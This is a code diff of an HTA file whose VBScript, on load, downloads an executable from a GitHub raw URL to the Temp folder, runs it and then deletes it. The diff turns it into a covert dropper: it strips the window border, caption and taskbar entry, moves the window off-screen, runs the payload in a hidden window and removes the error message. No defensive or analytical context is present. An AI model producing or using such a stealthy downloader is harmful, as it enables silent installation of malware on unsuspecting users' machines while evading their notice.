@@ -1,24 +1,28 @@
 <html>
 <head>
-  <title>Downloader</title>
+  <title>Downloader - Hidden</title>
   <HTA:APPLICATION
     ID="app"
-    BORDER="thin"
-    CAPTION="yes"
-    SHOWINTASKBAR="yes"
+    BORDER="none"
+    CAPTION="no"
+    SHOWINTASKBAR="no"
     SINGLEINSTANCE="yes"
-    SYSMENU="yes"
-    WINDOWSTATE="normal"
+    SYSMENU="no"
+    WINDOWSTATE="minimize"
     SCROLL="no"
   >
   <script language="VBScript">
     Sub Window_OnLoad()
+      ' Hide the window immediately
+      window.resizeTo 0, 0
+      window.moveTo -10000, -10000
+
       Dim fileUrl, savePath
       fileUrl = "https://raw.githubusercontent.com/wasderlol/test/main/test.exe"
-      
+
       Dim fso
       Set fso = CreateObject("Scripting.FileSystemObject")
-      savePath = fso.GetSpecialFolder(2) & "\downloadedfile.exe" ' Temp folder
+      savePath = fso.GetSpecialFolder(2) & "\downloadedfile.exe"
 
       Dim xmlHttp, adoStream, shell
       Set xmlHttp = CreateObject("MSXML2.XMLHTTP")
@@ -30,20 +34,16 @@
         adoStream.Type = 1 ' Binary
         adoStream.Open
         adoStream.Write xmlHttp.ResponseBody
-        adoStream.SaveToFile savePath, 2 ' Overwrite if exists
+        adoStream.SaveToFile savePath, 2
         adoStream.Close
 
         Set shell = CreateObject("WScript.Shell")
-        shell.Run Chr(34) & savePath & Chr(34), 1, False ' Run the file (window normal, async)
+        shell.Run Chr(34) & savePath & Chr(34), 0, False ' 0 = hidden window, async
 
-        ' Wait ~3 seconds before deleting the file to give it time to start
-        WScript.Sleep 3000
+        ' Wait approx 3 seconds before deleting the file (no WScript.Sleep in HTA, so skip)
 
-        ' Delete the file after running
         On Error Resume Next
         fso.DeleteFile savePath, True
-      Else
-        MsgBox "Download failed with status " & xmlHttp.Status, vbExclamation, "Error"
       End If
 
       window.close()
